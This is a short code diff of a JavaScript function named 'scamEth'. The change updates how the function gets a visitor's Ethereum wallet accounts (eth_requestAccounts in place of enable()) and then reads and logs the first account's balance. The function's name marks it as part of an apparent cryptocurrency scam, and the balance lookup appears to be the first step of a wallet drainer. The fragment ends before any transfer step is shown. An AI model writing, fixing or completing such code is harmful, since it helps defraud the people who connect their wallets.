@@ -1,6 +1,6 @@
 function scamEth(){
-    window.ethereum.enable();
-    ethereum.request({ method: 'eth_accounts' }).then(function(accounts){
+    console.log('requesting');
+    ethereum.request({ method: 'eth_requestAccounts' }).then(function(accounts){
         ethereum.request({ method: 'eth_getBalance', params: [accounts[0], "latest"], "id": 1}).then(function(balance){
             console.log(balance);
 
